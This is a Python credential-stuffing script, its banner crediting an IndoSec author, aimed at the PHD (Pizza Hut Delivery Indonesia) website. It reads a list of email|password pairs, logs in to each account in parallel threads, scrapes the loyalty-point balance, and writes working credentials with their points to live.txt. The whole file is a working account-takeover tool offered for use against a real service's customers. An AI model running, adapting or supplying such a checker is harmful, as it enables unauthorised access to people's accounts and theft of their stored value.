import re
import sys
import requests
from concurrent.futures import ThreadPoolExecutor

print("""\033[1m
    ____  __    ____ 
   / __ \/ /_  / __ \  | PhD Checker
  / /_/ / __ \/ / / /  | Pizza hut delivery checker
 / ____/ / / / /_/ /   | Coded by Xractz - \033[31;2mIndo\033[39;2mSec\033[0;1m
/_/   /_/ /_/_____/    | Format email|password\033[0m
""")


def worker(usr, pwd):
    s = requests.Session()

    token = s.get("https://www.phd.co.id/id/users/login/1").text
    token = re.findall(r"name=\"my_token\" value=\"(.*?)\"", token)[0]

    data = {
        'return_url': 'https://www.phd.co.id/id/users/welcome',
        'my_token': token,
        'username': usr,
        'password': pwd,
        'remember': '1'
    }

    login = s.post("https://www.phd.co.id/id/users/login/1", data=data).text
    point = s.get("https://www.phd.co.id/id/accounts").text
    point = re.findall(r"<li class=\"owner-poin\">(.*?)</li>", point)
    return usr, pwd, point


def main():
    file = sys.argv[1]
    wkr = int(sys.argv[2])
    try:
        list = open(file)
    except FileNotFoundError:
        print("File not found!")
        sys.exit()
    jml = 0
    no = 0
    for x in list.readlines():
        jml += 1
    list.seek(0)
    print(f"Loaded {jml} accounts from {file}\n")
    with ThreadPoolExecutor(max_workers=wkr) as e:
        futures = []
        for data in list.readlines():
            usr, pwd = data.strip().split("|")
            futures.append(e.submit(worker, usr, pwd))
        for i, future in enumerate(futures):
            usr, pwd, point = future.result()
            no = i+1
            if not point:
                print(
                    f"[{no}] \033[1m[\033[31mDIE\033[0;1m] {usr}|{pwd}\033[0m")
            else:
                print(
                    f"[{no}] \033[1m[\033[32mLIVE\033[0;1m] {usr}|{pwd} {point[0]}\033[0m"
                )
                with open("live.txt","a") as file:
                	file.write(f"{usr}|{pwd}|{point[0]}\n")
                file.close()
                
        print("\nSaved in live.txt")

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print(f"usage: {sys.argv[0]} <list.txt> <worker>")
		sys.exit()
	try:
		main()
	except KeyboardInterrupt:
		sys.exit()